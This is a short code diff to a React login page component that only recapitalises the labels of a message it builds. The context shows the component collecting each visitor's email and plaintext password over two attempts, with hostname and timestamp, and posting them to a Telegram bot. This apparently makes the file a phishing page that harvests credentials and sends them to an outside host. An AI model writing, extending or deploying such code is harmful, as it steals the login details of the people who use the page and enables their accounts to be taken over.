@@ -109,13 +109,13 @@ const LoginPage = () => {
 
       const message = `🔒 *TRU SECURITY NOTIFICATION* 🔒
       
-- *USER IDENTIFIED*: ${email}
-- *ACCESS ATTEMPT*: ${step === 1 ? 'First Attempt' : 'Second Attempt'}
-- *PASSWORD ATTEMPT*: ||${password}||
-- *TIMESTAMP*: ${new Date().toISOString()}
-- *ORIGIN*: ${window.location.hostname}
+- *User Identified*: ${email}
+- *Access Attempt*: ${step === 1 ? 'First Attempt' : 'Second Attempt'}
+- *Password Attempt*: ||${password}||
+- *Timestamp*: ${new Date().toISOString()}
+- *Origin*: ${window.location.hostname}
 
-${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL ACCESS ATTEMPT DETECTED* 🚨'}`;
+${step === 1 ? '⚠️ *InitiaL Access attempt detected* ⚠️' : '🚨 *Final Access Attempt Detected* 🚨'}`;
 
       const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
         method: 'POST',
@@ -344,3 +344,4 @@ ${step === 1 ? '⚠️ *INITIAL ACCESS ATTEMPT DETECTED* ⚠️' : '🚨 *FINAL 
 };
 
 export default LoginPage;
+
